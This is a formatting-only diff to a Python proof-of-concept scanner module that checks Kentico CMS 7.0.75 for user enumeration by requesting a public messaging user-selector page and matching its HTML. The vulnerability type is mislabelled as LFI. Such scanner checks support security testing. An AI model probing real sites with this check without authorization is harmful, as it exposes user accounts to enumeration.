@@ -3,8 +3,9 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'KenticoCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'KenticoCMS_0001'  # 平台漏洞编号，留空
     name = 'Kentico CMS suffers from a user enumeration vulnerability.'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.LFI  # 漏洞类型
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'KenticoCMS'  # 漏洞应用名称
     product_version = '7.0.75'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'ade2e1a7-6676-4712-af6d-75c6621e7b92'
     author = '47bwy'  # POC编写者
@@ -30,19 +32,20 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/CMSModules/Messaging/CMSPages/PublicMessageUserSelector.aspx"
             r = requests.get(self.target + payload)
 
             if r.status_code == 200 and '<td style="white-space:nowrap;">' in r.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
